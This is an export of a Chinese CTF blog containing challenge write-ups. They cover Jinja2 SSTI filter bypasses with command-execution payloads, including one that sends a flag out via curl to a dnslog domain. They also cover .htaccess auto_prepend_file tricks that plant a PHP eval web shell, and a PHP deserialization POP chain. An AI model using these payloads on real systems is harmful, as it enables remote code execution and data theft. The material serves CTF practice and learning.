<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFshow-web361~371</title>
    <url>/2024/07/18/CTFshow-web361-371/</url>
    <content><![CDATA[<h1 id="CTFshow-web361-371"><a href="#CTFshow-web361-371" class="headerlink" title="CTFshow-web361~371"></a>CTFshow-web361~371</h1><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>知识点：ssti</p>
<p>基本的常用语句有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过内置的函数来获取shell</p>
<p>注入点为GET提交的name参数，及payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>知识点：ssti</p>
<p>这个题也可以通过第一题的方法来获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>知识点：引号过滤以及POST提交过滤</p>
<p>过滤引号可以通过request请求来进行绕过</p>
<p>常见的几种形式和用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request.args.ben&#125;&#125; #可以用来获取get请求传参，参数为ben</span><br><span class="line">&#123;&#123;request.form.ben&#125;&#125;  #可以来获取poet请求传参ben（Content-Type:application/x-www-from-urlencoded或multipart/from-data）</span><br><span class="line">&#123;&#123;request.cookie.ben&#125;&#125; #可以来获取cookie中关键词为ben的参数</span><br><span class="line">&#123;&#123;request.values.x1&#125;&#125; #获取所有参数</span><br><span class="line">&#123;&#123;request.headers&#125;&#125;  #获得请求头请求参数</span><br><span class="line">&#123;&#123;request.data&#125;&#125;  #post传入参数(Content-Type:a/b)</span><br><span class="line">&#123;&#123;request.json&#125;&#125;  #获得post传入json参数(Content-Type:application/json)</span><br></pre></td></tr></table></figure>
<p>当然我个人认为request.values.x1最好用，可以获取全局参数</p>
<p>将过滤的部分直接通过替换即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[request.args.ben].popen(request.args.ben1).read()&#125;&#125;&amp;ben=os&amp;ben1=cat /*</span><br></pre></td></tr></table></figure>
<h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>知识点：引号过滤，args过滤，post提交过滤</p>
<p>这个题可能是想通过cookie来实现，但是麻烦，还是通过request.values.x1好点，因为简单</p>
<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure>
<h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>知识点：中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>绕过[]的方法，可以通过<strong>getitem</strong>()魔术方法来实现，用法也简单，可以直接平替</p>
<p>例如：</p>
<p><strong>subclasses</strong>()[117]  —&gt; <strong>subclasses</strong>().<strong>getitem</strong>(117)</p>
<p>尽量选用简单的语句，就是少中括号的来实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__.__getitem__(request.values.q).popen(request.values.a).read()&#125;&#125;&amp;a=cat /*&amp;q=os</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure>
<h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>知识点：下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>下划线绕过可以通过管道符和attr和request请求来进行绕过</p>
<p>如：</p>
<p>lipsum.<strong>globals</strong>—&gt;lipsum|attr(request.values.globals)</p>
<p>所以就可以构造payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).os.popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*</span><br></pre></td></tr></table></figure>
<h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>知识点：os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>这里有些不同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals.os&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(request.values.q)|attr(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个不会执行</span><br><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个会执行</span><br></pre></td></tr></table></figure>
<p>所以需要留意一下</p>
<p>所以payload为：(二选一即可)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br><span class="line">&#123;&#123;(config|attr(request.values.class)|attr(request.values.init)|attr(request.values.globals)|attr(request.values.getitem)(request.values.o)).popen(request.values.rce).read()&#125;&#125;&amp;class=__class__&amp;init=__init__&amp;globals=__globals__&amp;getitem=__getitem__&amp;o=os&amp;rce=cat /*</span><br></pre></td></tr></table></figure>
<h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>知识点：双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>绕过双括号，可以通过<code>&#123;%print()%&#125;</code>即可</p>
<p>payload为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print (lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()%&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br></pre></td></tr></table></figure>
<h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>知识点：request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>无法通过提交参数来进行绕过，需要通过join来进行拼接字符</p>
<p>获取字符的方法，通过config|string|list  和  lipsum|string|list来获得</p>
<p>具体的构造的payload： （注意将注释的删除）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set e=(config|string|list).pop(279)%&#125; //  /</span><br><span class="line">//&#123;%set a=(config|string|list).pop(191)%&#125; //  &#x27;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(18)%&#125;  // _</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(9)%&#125;  // 空格</span><br><span class="line">//&#123;% set qwe=dict(l=0,s=1)|join%&#125;  //ls</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=1)|join,c,c)|join %&#125;  //__globals__</span><br><span class="line">&#123;%set s=dict(o=0,s=1)|join%&#125;   //os</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=1)|join,c,c)|join %&#125;  //__getiyem__</span><br><span class="line">//&#123;% set popen=dict(popen=1)|join%&#125;  //popen</span><br><span class="line">//&#123;% set read=dict(read=1)|join%&#125;  //read</span><br><span class="line">&#123;% set flag=(((dict(tac=1)|join,kg)|join,e)|join,dict(flag=1)|join)|join %&#125;</span><br><span class="line">//&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br><span class="line">&#123;%print (lipsum|attr(globals)|attr(geti)(s)).popen(flag).read() %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>知识点：数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>获取数字可以通过count来实现，如nine=dict(aaaaaaaaa=a)|join|count</p>
<p>再将数字替代即可</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;% set qwe=dict(l=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set flag=(((dict(tac=a)|join,kg)|join,e)|join,dict(flag=a)|join)|join %&#125;</span><br><span class="line">&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="371"><a href="#371" class="headerlink" title="371"></a>371</h2><p>知识点：过滤print，数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
<p>绕过print需要通过dnslog带出</p>
<p>URL</p>
<p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
<p>在该网站来申请免费的dnslog</p>
<p>再通过  执行curl <code>cat /flag</code>.7ytmqy.dnslog.cn </p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set ba=dict(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set n=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set aaa=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set q=(config|string|list).pop(aaa)%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;%set p=((lipsum|attr(globals))|string|list).pop(n)%&#125;</span><br><span class="line">&#123;%set fla=(dict(curl=a)|join,kg,p,dict(cat=a)|join,kg,e,dict(flag=a)|join,p,q,dict(cfiyve=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;</span><br><span class="line">&#123;%if ((lipsum|attr(globals))|attr(geti)(s)).popen(fla)%&#125;ataoyyds&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>web ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/06/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>浅谈ctf中.htaccess配置文件的运用</title>
    <url>/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/</url>
    <content><![CDATA[<p>相关的文章为：<a href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
<h3 id="htaccess配置文件的基本信息"><a href="#htaccess配置文件的基本信息" class="headerlink" title=".htaccess配置文件的基本信息"></a>.htaccess配置文件的基本信息</h3><p>首先先了解一下有关.htaccess文件是什么，是一个配置文件，用于运行Apache网络服务器软件的网络服务器上，当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。 简单来说就是用来修改配置的</p>
<p>然后补充一点就是在.htaccess配置文件中单行注释符为 # </p>
<p>如果想要在服务器上可以运行.htaccess文件就需要先将主配置文件的AllowOverride 设置为 All</p>
<h3 id="具体的运用"><a href="#具体的运用" class="headerlink" title="具体的运用"></a>具体的运用</h3><h4 id="通过-htaccess文件来制定出错页面"><a href="#通过-htaccess文件来制定出错页面" class="headerlink" title="通过.htaccess文件来制定出错页面"></a>通过.htaccess文件来制定出错页面</h4><blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ErrorDocument <span class="number">401</span> /error/<span class="number">401</span>.php</span><br><span class="line">ErrorDocument <span class="number">403</span> /error/<span class="number">403</span>.php</span><br><span class="line">ErrorDocument <span class="number">404</span> /error/<span class="number">404</span>.php</span><br><span class="line">ErrorDocument <span class="number">500</span> /error/<span class="number">500</span>.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在ctf比赛题目中就有应用：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;If <span class="string">&quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;</span>&gt;  <span class="comment">//~ 类似为正则匹对</span></span><br><span class="line">ErrorDocument <span class="number">404</span> <span class="string">&quot;y4tacker&quot;</span></span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果在/flag中有flag{a 就返回y4tacker，从而来枚举出flag,比较少用</p>
<h4 id="SetHandler和ForceType"><a href="#SetHandler和ForceType" class="headerlink" title="SetHandler和ForceType"></a>SetHandler和ForceType</h4><p>常见的应用场景 文件上传，这里要严格按照缩进，可能会出现错误：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;aaa.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//指定将1.jpg通过PHP运行</span></span><br><span class="line"><span class="comment">//或者直接全局都直接使用PHP解析</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;Files ~ <span class="string">&quot;\.jpg$&quot;</span>&gt;   <span class="comment">//~先当于正则匹对 将所有匹对到.jpg结尾的都以PHP解析</span></span><br><span class="line">ForceType application/x-httpd-php  </span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h4><p>作用就是将什么以什么方式解析，作用域是针对整个服务器或特定目录的，而不是针对单个文件的，所以不需要通过Files来进行规定</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddHandler php-script .jpg  <span class="comment">//将jpg文件当作PHP脚本</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a><strong>AddType</strong></h4><p>是Apache服务器配置中的一个重要指令，它用于将特定的文件扩展名映射到指定的MIME类型</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .html</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这条指令告诉Apache服务器，当遇到.html扩展名的文件时，应该将它们视为application/x-httpd-php类型的文件，即PHP脚本文件，并由PHP解析器进行处理</p>
<h4 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h4><p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess  文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以</p>
<p>php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag</p>
<p>实际的应用中就有：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file <span class="number">1</span>.txt <span class="comment">//在主文件解析之前自动解析包含1.txt的内容</span></span><br><span class="line">php_value auto_append_file <span class="number">2</span>.txt <span class="comment">//在主文件解析后自动解析1.txt的内容</span></span><br><span class="line"><span class="comment">//最好是这样，应用#号为注释符，但是PHP可以正常解析来上传一句话木马</span></span><br><span class="line">php_value auto_prepend_file .htaccess <span class="comment">#&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//关于过滤file： 这样也是可以执行命令的</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>还有一种用法，绕过preg_match匹对，将最大的次数改为0即可，就可以用最大回溯(pcre.backtrack_limit)/递归限制使php正则失效：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">1</span>  <span class="comment">//默认为100000</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="具体的例题"><a href="#具体的例题" class="headerlink" title="具体的例题"></a>具体的例题</h3><p>[羊城杯 2020]easyphp</p>
<p>源码：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  </span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;   <span class="comment">//遍历目录，将不是index.php的文件都删除</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);  </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123; <span class="comment">//通过get来提交文件名和内容</span></span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];  <span class="comment">//在文件内容里面过滤关键字</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123; </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];   <span class="comment">//</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123; <span class="comment">//检查文件名是否都由字母和点组成</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">     <span class="keyword">die</span>(); </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  <span class="comment">//再删除一次</span></span><br><span class="line"> <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123; </span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); </span><br><span class="line">         &#125; </span><br><span class="line">     &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);  <span class="comment">//在后面拼接一段字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>看逻辑应该是在删除后再创建的文件，但是上传一个普通的php文件，发现上传什么都没有用，无论怎么上传，页面都只是显示Hello, world</p>
<p>这里就可以通过上传.htaccess来修改配置</p>
<blockquote>
<p>php_value auto_prepend_file .htaccess</p>
<h1 id="lt-php-system-‘cat-f-’-gt"><a href="#lt-php-system-‘cat-f-’-gt" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;"></a>&lt;?php system(‘cat /f*’);?&gt;</h1></blockquote>
<p>但是需要有些修改，还有要将后面的\nHello, world继续拼接否则回报错</p>
<p>这里过滤了file 可以通过变为</p>
<blockquote>
<p>php_value auto_prepend_fil\<br>e .htaccess</p>
<h1 id="lt-php-system-‘cat-f-’-gt-1"><a href="#lt-php-system-‘cat-f-’-gt-1" class="headerlink" title="&lt;?php system(‘cat /f*’);?&gt;\"></a>&lt;?php system(‘cat /f*’);?&gt;\</h1></blockquote>
<p>最后再通过url编码上传即可</p>
<p>最后payload为：</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_fil%<span class="number">5</span>C%<span class="number">0</span>Ae%<span class="number">20</span>.htaccess%<span class="number">0</span>A%<span class="number">23</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system(<span class="string">&#x27;cat%20/f*&#x27;</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">5</span>C</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>ctf htaccess</tag>
      </tags>
  </entry>
  <entry>
    <title>武功山杯·湘赣边大学生网络安全竞赛部分题解</title>
    <url>/2024/07/28/%E6%AD%A6%E5%8A%9F%E5%B1%B1%E6%9D%AF%C2%B7%E6%B9%98%E8%B5%A3%E8%BE%B9%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="石能为鼓"><a href="#石能为鼓" class="headerlink" title="石能为鼓"></a>石能为鼓</h2><p>知识点：php反序列化</p>
<p>首先通过查看源代码发现source.php文件</p>
<p><img src="https://luokuang1.github.io/images/t1.png" width="40%" height="30%"></p>
<p>访问得题目的源码：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">class ping &#123;  </span><br><span class="line">protected $xiang;  </span><br><span class="line">function __construct() &#123;</span><br><span class="line">	$this-&gt;xiang = new fun(); </span><br><span class="line">    &#125;  </span><br><span class="line">function __destruct() &#123;</span><br><span class="line">    $this-&gt;xiang-&gt;cp();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class fun &#123;  </span><br><span class="line">function cp() &#123;    </span><br><span class="line">    echo &quot;hello&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class cup &#123;  </span><br><span class="line">    private $data;  </span><br><span class="line">    function cp() &#123;    </span><br><span class="line">       eval($this-&gt;data);  </span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;d&#x27;]);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>就是一个简单的序列化题，只不过在反序列化中有一个特性，将原来属性的修饰符修改是不会影响反序列化的结果，所以在构造pop链的时候可以将原来的属性修饰符进行修改，便于赋值与序列化</p>
<p>最终的pop链为：</p>
<blockquote>
<p>&lt;?php </p>
<p>class ping{</p>
<p>public $xiang;</p>
<p>}</p>
<p>class cup{</p>
<p>public $data=”system(‘cat /*’);”;</p>
<p>}</p>
